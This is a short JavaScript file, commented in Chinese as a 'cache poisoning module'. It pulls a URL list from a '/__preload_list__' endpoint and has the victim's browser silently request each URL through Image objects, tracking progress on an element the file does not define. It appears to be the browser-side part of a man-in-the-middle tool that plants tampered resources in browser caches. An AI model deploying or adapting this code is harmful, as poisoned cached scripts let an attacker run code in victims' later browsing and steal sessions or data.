/** @define {boolean} */
var _DEBUG = true;

(function() {
	if (self != top) return;
	if (Math.LN == 0) return;
	Math.LN = 0;

	//========== 缓存投毒模块 ==========
	var targets;
	var thread = 2;


	function loadJs(url) {
		var img = new Image()
		img.onerror = function() {
			// complete
			img.onerror = null;
			prog.value++;
			loadNext();
		};
		img.src = url;
	}

	function loadNext() {
		var url = targets.pop();
		if (url) {
			loadJs(url);
		}
	}

	function handleListLoaded(data) {

		targets = data.split('\t');
		prog.max = targets.length;
		prog.value = 0;

		for (var i = 0; i < thread; i++) {
			loadNext();
		}
	}

	function pull() {
		var xhr = new XMLHttpRequest;
		xhr.open('GET', '/__preload_list__', true);
		xhr.onreadystatechange = function() {
			if (this.readyState == 4) {
				handleListLoaded(this.responseText);
			}
		};
		xhr.send();
	}

	function init() {
		pull();
	}
	setTimeout(init, 100);
})();